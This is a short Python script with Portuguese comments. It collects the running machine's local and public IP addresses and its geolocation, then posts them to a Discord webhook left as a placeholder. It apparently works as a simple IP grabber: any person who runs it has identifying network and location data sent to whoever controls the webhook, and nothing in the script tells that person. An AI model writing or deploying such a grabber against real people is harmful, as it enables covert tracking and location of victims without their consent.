import requests
import socket
import ipapi
from dhooks import Webhook

#iniciando script
hook = Webhook('Seu Webhook')

#consumindo apis
ipl = socket.gethostbyname(socket.gethostname())
ipp = requests.get('https://api.ipify.org/').text
info = ipapi.location(f'{ipp}')

#enviando dados
hook.send(f'IP Local: {ipl} IP Publico: {ipp}')
hook.send(f'info: {info}')